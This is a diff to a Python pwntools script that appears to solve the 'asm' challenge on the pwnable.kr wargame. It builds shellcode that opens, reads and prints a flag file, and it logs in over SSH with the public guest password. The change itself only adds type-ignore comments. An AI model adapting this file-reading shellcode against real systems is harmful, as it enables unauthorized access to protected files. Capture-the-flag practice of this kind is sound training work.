@@ -8,11 +8,11 @@ length = 50
 
 # Generate shellcode using pwntools
 shellcode = asm(
-    shellcraft.open(file_name) +
-    shellcraft.read('rax', 'rsp', length) +
-    shellcraft.write(1, 'rsp', length) +
-    shellcraft.exit(0)
-)
+    shellcraft.open(file_name) +#type:ignore
+    shellcraft.read('rax', 'rsp', length) +#type:ignore
+    shellcraft.write(1, 'rsp', length) +#type:ignore
+    shellcraft.exit(0)#type:ignore
+) 
 
 # SSH into the target Linux machine
 sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)  # SSH details
